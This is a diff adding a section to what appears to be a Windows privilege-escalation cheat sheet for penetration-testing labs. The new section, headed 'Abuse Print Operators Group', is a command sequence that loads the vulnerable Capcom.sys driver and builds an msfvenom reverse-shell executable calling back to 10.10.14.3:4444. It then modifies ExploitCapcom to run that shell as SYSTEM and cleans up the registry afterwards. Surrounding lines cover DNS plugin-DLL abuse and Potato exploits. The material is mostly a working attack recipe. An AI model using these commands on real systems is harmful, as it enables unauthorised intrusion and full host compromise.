@@ -435,6 +435,21 @@ reg query \\10.129.43.9\HKLM\SYSTEM\CurrentControlSet\Services\DNS\Parameters
 reg delete \\10.129.43.9\HKLM\SYSTEM\CurrentControlSet\Services\DNS\Parameters  /v ServerLevelPluginDll
 sc start dns
 ```
+### Abuse Print Operators Group
+https://github.com/FuzzySecurity/Capcom-Rootkit/blob/master/Driver/Capcom.sys  
+https://github.com/tandasat/ExploitCapcom/blob/master/ExploitCapcom/ExploitCapcom/ExploitCapcom.cpp
+```
+EoPLoadDriver.exe System\CurrentControlSet\Capcom c:\Tools\Capcom.sys
+
+msfvenom -p windows/x64/shell_reverse_tcp LHOST=10.10.14.3 LPORT=4444 -f exe -o reverse.exe
+Replace "C:\\Windows\\system32\\cmd.exe" with the path of reverse.exe in ExploitCapcom.cpp
+transfer reverse.exe and ExploitCapcom.exe
+Execute ExploitCapcom
+```
+Cleanup
+```
+reg delete HKCU\System\CurrentControlSet\Capcom
+```
 ### Abuse SeImpersonatePrivilege(GodPotato->JuicyPotatoNG->RoguePotato->PrintSpoofer->JuicyPotato)
 >JuicyPotato -> Windows 7/8, Server 2008 R2/2012/2012 R2, early Windows 10/Server 2016
 >RoguePotato -> Intended for Windows 10 1809+ and Server 2019 where JuicyPotato stopped working
